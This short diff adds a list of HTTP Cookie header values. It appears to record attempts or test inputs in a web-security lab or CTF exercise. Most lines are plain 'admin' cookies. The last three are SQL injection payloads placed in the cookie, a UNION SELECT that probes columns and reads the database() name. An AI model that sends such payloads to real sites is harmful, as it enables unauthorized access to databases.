@@ -1,0 +1,15 @@
+Cookie:admin
+Cookie:
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:admin" union select 1,1,1 limit 1,1#
+Cookie:admin" union select 1,1,database() limit 1,1#
+Cookie:admin" union select 1,1,database() limit 1,1#
